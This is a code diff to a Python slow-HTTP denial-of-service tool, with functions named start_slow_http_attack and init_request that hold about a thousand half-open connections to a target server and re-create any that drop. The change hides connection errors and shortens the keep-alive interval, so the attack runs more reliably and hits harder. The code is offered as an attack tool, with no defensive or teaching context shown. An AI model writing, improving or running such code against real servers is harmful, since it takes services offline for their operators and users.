@@ -13,18 +13,21 @@ ongoing = True
 
 def init_request(url: str, port: int) -> socket:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = socket.gethostname()
-    print (socket.gethostbyname(url))
-    print ('Connecting to ', url, port, ongoing)
-    s.connect((url, port))
 
-    s.send(b"GET / HTTP/1.1\r\n")
+    print ('Connecting to ', url, port, ongoing)
+    try:
+        s.connect((url, port))
+
+        s.send(b"GET / HTTP/1.1\r\n")
+    except:
+        pass
     return s
 
 
 def start_slow_http_attack(url: str,
                            port: int,
-                           workers_count: int = 1000) -> None:
+                           workers_count: int = 1000,
+                           sleep_: int = 10) -> None:
     global ongoing
     sockets = [init_request(url, port) for _ in range(workers_count) if ongoing]
     ongoing = True
@@ -38,7 +41,7 @@ def start_slow_http_attack(url: str,
             except socket.error:
                 # recreate a dead socket
                 sockets[i] = init_request(url, port)
-        time.sleep(30)
+        time.sleep(sleep_)
 
 
 def stop_slow_http_attack() -> None: 
